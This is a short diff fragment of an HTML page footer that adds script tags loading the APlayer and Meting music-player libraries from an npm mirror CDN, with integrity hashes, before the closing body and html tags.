+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
